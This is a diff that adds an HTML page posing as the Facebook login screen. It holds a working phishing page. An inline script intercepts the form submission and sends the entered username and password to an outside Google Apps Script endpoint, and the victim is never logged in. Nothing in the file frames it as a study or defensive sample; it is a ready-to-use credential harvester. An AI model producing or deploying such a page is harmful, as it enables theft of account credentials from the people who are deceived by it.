@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login</title>
+<link rel="stylesheet" href="fb.css">
+</head>
+<body>
+<div class="fb-login-container">
+    <div class="fb-login-box">
+        <img src="fb.png" alt="Facebook Logo" class="fb-logo">
+        <form name="login-fb">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Email address or phone number">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Password">
+            </div>
+            <button type="submit" class="fb-button">Log In</button>
+        </form>
+        <div class="fb-links">
+            <a href="#">Forgot password?</a>
+            <span class="fb-link-divider">·</span>
+            <a href="#">Create new account</a>
+        </div>
+    </div>
+</div>
+
+<script src="fb.js"></script>
+
+ <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwk0bgzf3H6D1TMY5Yj854PLO9ZxG3XcXiOaX15V0A3SUaAMG0BRwOkWK19kNLgcASB/exec'
+  const form = document.forms['login-fb']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+</body>
+</html>
